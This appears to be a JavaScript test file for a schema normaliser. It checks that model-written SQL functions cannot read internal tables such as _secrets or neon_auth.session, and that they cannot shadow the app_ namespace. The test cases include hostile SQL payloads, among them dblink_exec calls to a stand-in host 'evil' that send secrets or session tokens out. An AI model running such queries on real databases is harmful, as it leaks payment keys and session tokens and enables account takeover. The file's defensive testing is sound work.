// A model-written SQL function may never name an internal table.
//
// Why this guard exists rather than resting on the sandbox argument, which does
// NOT cover it — every link measured, not assumed:
//
//   1. the function is created SECURITY DEFINER by default, so it runs as the
//      database owner and bypasses RLS
//   2. it is GRANT EXECUTE'd to `anonymous`, so any visitor can call it
//   3. `_secrets` holds the site owner's Stripe key, in that same database
//   4. `dblink` and `postgres_fdw` install successfully on Neon — proved live
//      by `neon-e2e`, which prints "EGRESS IS OPEN via: dblink, postgres_fdw"
//
// Read anything · by anyone · with a way out. site-schema.mjs's own comment said
// model SQL "reaches no other site, no Go Farther table and no secret" — the
// first two hold, the third never did.
import { test } from "node:test";
import assert from "node:assert/strict";
import fs from "node:fs";
import path from "node:path";
import { normalizeSchema } from "../site-schema.mjs";

const spec = (body) => ({
  tables: [{ name: "bookings", access: "collect", columns: ["customer_name"] }],
  functions: [{ name: "peek", returns: "text", body, language: "sql" }],
});
const fns = (body) => (normalizeSchema(spec(body)).functions || []).map((f) => f.name);

test("a body naming _secrets is refused outright", () => {
  assert.deepEqual(fns("SELECT value FROM _secrets LIMIT 1"), [],
    "the Stripe key lives there and a definer function can read it");
});

test("every internal table is refused, not just _secrets", () => {
  // Named one by one: a guard that happens to catch the right COUNT while
  // missing _meta is a guard that reads as working.
  for (const t of ["_meta", "_users", "_sessions", "_invites", "_identities",
                   "_credentials", "_auth_codes", "_auth_events", "_audit", "_teams"]) {
    assert.deepEqual(fns("SELECT * FROM " + t), [], t + " must be refused");
  }
});

test("it is refused wherever it appears, not only after FROM", () => {
  for (const b of [
    "SELECT (SELECT value FROM _secrets LIMIT 1)",
    "SELECT * FROM public._secrets",
    "SELECT * FROM \"_secrets\"",
    "SELECT dblink_exec('host=evil', 'SELECT * FROM _secrets')",
  ]) {
    assert.deepEqual(fns(b), [], "must refuse: " + b);
  }
});

test("an ordinary function still passes — the guard is not a blanket refusal", () => {
  // The direction that matters second: a guard that refuses everything would
  // pass every test above while silently removing the whole RPC tier.
  assert.deepEqual(fns("SELECT customer_name FROM bookings WHERE id = 1"), ["peek"]);
});

test("a declared table whose name merely CONTAINS an internal one still works", () => {
  // `_users` must not match `site_users_archive`. Word-bounded on both sides.
  const s = { tables: [{ name: "member_notes", access: "display", columns: ["note"] }],
              functions: [{ name: "ok_fn", returns: "text", body: "SELECT note FROM member_notes", language: "sql" }] };
  assert.deepEqual((normalizeSchema(s).functions || []).map((f) => f.name), ["ok_fn"]);
});

test("the guard is in the normaliser, which every build passes through", () => {
  // normalizeSchema is the one choke point — `coerceTable`'s allow-list has
  // dropped a declared feature silently before (teamScope, dead at five
  // layers). A guard applied anywhere else can be bypassed by a caller that
  // does not use it.
  const src = fs.readFileSync(path.join(import.meta.dirname, "..", "site-schema.mjs"), "utf8");
  const norm = src.slice(src.indexOf("export function normalizeSchema"), src.indexOf("async function pgTrigger"));
  assert.match(norm, /_\(secrets\|meta\|users/, "the refusal must live inside normalizeSchema");
});

test("neon_auth is refused — it is where the live sessions actually are", () => {
  // THE GAP THE UNDERSCORE LIST LEFT WIDE OPEN. Those `_something` names are
  // OURS, and most went with the hand-built auth layer on 2026-07-30. Identity
  // today lives in `neon_auth."user"` / `.session` / `.account` / `.verification`,
  // created by Neon Auth — none of which match `_something`. So the deny-list
  // was guarding deleted tables while the real store stood open.
  //
  // Every model function is SECURITY DEFINER (bypasses RLS) and a non-`internal`
  // one is GRANTed to `anonymous`, so a body reading `neon_auth.session` hands
  // any visitor every member's live session token — account takeover of that
  // site — and `dblink` is installable on Neon, so it can be posted outbound.
  for (const b of [
    "SELECT token FROM neon_auth.session",
    'SELECT * FROM neon_auth."user"',
    "SELECT * FROM NEON_AUTH.account",
    "SELECT accessToken FROM neon_auth.account WHERE 1=1",
    "SELECT identifier, value FROM neon_auth.verification",
    "SELECT dblink_exec('host=evil', 'SELECT token FROM neon_auth.session')",
  ]) {
    assert.deepEqual(fns(b), [], "must refuse: " + b);
  }
});

test("a table merely NAMED like the auth schema is not caught by it", () => {
  // Word-bounded, like the underscore list: `neon_authors` is an ordinary table
  // name and refusing it would be the blanket-refusal direction.
  const s = {
    tables: [{ name: "neon_authors", access: "display", columns: ["name"] }],
    functions: [{ name: "ok_fn", returns: "text", body: "SELECT name FROM neon_authors", language: "sql" }],
  };
  assert.deepEqual((normalizeSchema(s).functions || []).map((f) => f.name), ["ok_fn"]);
});

test("the engine's app_ namespace cannot be shadowed by a declared function", () => {
  // `app_user_id` was named explicitly and `app_team_id` was not — the same hole
  // one function over. It is what every `teamScope` policy calls to decide which
  // team's rows a member may read and write, so a declared function of that name
  // rewrites the sharing rules of the whole site from inside a page's data model.
  // The guard is on the PREFIX now: the engine owns `app_`, and a helper added
  // later is covered without anybody remembering to come back here.
  for (const n of ["app_user_id", "app_team_id", "app_anything_else"]) {
    const s = {
      tables: [{ name: "notes", access: "display", columns: ["note"] }],
      functions: [{ name: n, returns: "text", body: "SELECT 'attacker'", language: "sql" }],
    };
    assert.deepEqual((normalizeSchema(s).functions || []).map((f) => f.name), [], "must drop: " + n);
  }
  // And an ordinary name starting with the letters is unaffected — `apply_x` is
  // not in the namespace, and refusing it would be the blanket direction.
  const ok = {
    tables: [{ name: "notes", access: "display", columns: ["note"] }],
    functions: [{ name: "apply_discount", returns: "text", body: "SELECT note FROM notes", language: "sql" }],
  };
  assert.deepEqual((normalizeSchema(ok).functions || []).map((f) => f.name), ["apply_discount"]);
});
